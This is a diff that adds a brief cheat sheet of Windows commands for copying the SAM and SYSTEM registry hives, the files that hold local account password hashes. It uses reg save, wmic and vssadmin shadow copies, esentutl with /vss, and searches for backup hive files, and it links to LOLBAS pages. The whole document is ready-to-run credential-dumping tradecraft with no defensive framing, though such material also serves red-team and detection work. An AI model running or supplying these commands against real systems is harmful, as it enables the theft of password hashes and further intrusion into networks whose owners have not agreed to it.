@@ -1,0 +1,30 @@
+``` Registry
+
+reg save hklm\sam C:\Windows\temp\SAM
+reg save hklm\system C:\Windows\temp\SYSTEM
+```
+
+``` Wmic.exe [https://lolbas-project.github.io/lolbas/Binaries/Wmic/]
+
+wmic shadowcopy call create Volume='C:\'
+vssadmin.exe list shadows ---> cari Shadow Copy Volume
+mkdir C:\temp
+copy \\<Shadow Copy Volume Location>\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+copy \\<Shadow Copy Volume Location>\Windows\System32\config\SAM C:\temp\SAM
+```
+
+``` Esentutl.exe [https://lolbas-project.github.io/lolbas/Binaries/Esentutl/]
+
+esentutl.exe /y /vss c:\windows\system32\config\SAM /d c:\windows\temp\SAM
+esentutl.exe /y /vss c:\windows\system32\config\SYSTEM /d c:\windows\temp\SYSTEM
+```
+
+``` Find SAM\SYSTEM backuped
+
+cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK
+cd C:\Windows\System32 & dir /S /B SAM == SYSTEM == SAM.* == SYSTEM.*
+
+# Check permissions
+icacls C:\Windows\System32\Config
+```
+
